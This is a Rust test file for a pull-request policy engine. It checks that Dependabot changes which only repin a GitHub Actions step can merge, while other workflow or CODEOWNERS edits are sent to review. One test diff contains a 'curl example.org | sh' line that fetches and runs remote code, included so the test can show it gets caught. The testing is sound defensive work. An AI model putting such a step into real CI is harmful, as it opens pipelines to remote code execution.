//! Workflow repins are a dependency-bot exemption, not permission to edit CI.
use super::{TRUNK, head};
use crate::flow::*;
use crate::sim::REMI;
use serde_json::json;

fn decision(diff: Option<&str>, path: &str) -> (Next, Facts) {
    let (h, _, m) = super::flow::setup();
    h.remove_flow_reviews(REMI, 3);
    h.edit_pull(REMI, 3, |p| {
        p["head"]["ref"] = json!("dependabot/actions/build")
    });
    h.refresh_flow(REMI, 3);
    let bot = "49699333+dependabot[bot]@users.noreply.github.com";
    h.commit_details(&head(3), Some("deps: bump"), Some(bot), Some(bot));
    h.touch(&head(3), &[path]);
    if let Some(diff) = diff {
        h.flow_diff(TRUNK, &head(3), diff);
    }
    let f = read(
        &h,
        &REMI.parse().unwrap(),
        3,
        &conary_core::Policy::parse(b"{}").unwrap(),
        Settings::default(),
        &["owner".into()],
    )
    .unwrap();
    (next(&f, &m, 4000).0, f)
}
const PIN: &str = "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n@@ -1 +1 @@\n-    uses: actions/checkout@old # v4\n+    uses: actions/checkout@new # v5\n";
#[test]
fn a_paired_action_repin_keeps_the_dependency_ci_exemption() {
    // deps.py / touches.py: repin the same uses step, without changing its gate.
    let (n, f) = decision(Some(PIN), ".github/workflows/ci.yml");
    assert!(!f.gate_edited);
    assert_eq!(n.step, Step::Merge);
}
#[test]
fn gate_edits_and_unread_diffs_need_review() {
    // deps.py: changed commands, permissions, action identity, shape, or an
    // unreadable gate diff all leave the CI-only dependency path.
    for diff in [
        None,
        Some(""),
        Some(
            "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\nold mode 100644\nnew mode 100755\n",
        ),
        Some(
            "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n@@ -1 +1 @@\n-    uses: actions/checkout@old\n+    uses: someone/other@new\n",
        ),
        Some(
            "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n@@ -1 +1 @@\n-    uses: actions/checkout@old\n+    run: curl example.org | sh\n",
        ),
    ] {
        let (n, f) = decision(diff, ".github/workflows/ci.yml");
        assert!(f.gate_edited);
        assert_eq!(n.step, Step::QueueReview("reviewer".into()));
    }
    let (n, f) = decision(Some(PIN), ".github/CODEOWNERS");
    assert!(f.gate_edited);
    assert_eq!(n.step, Step::QueueReview("reviewer".into()));
}
#[test]
fn an_inserted_or_reordered_uses_line_is_an_edit_not_a_repin() {
    // touches.py pins_only: every removed line must pair in place.
    for replacement in [
        "+    uses: actions/checkout@new\n+    uses: other/action@ref\n",
        "+      uses: actions/checkout@new\n",
    ] {
        let changed = PIN.replace("+    uses: actions/checkout@new # v5\n", replacement);
        assert!(
            decision(Some(&changed), ".github/workflows/ci.yml")
                .1
                .gate_edited
        );
    }
}
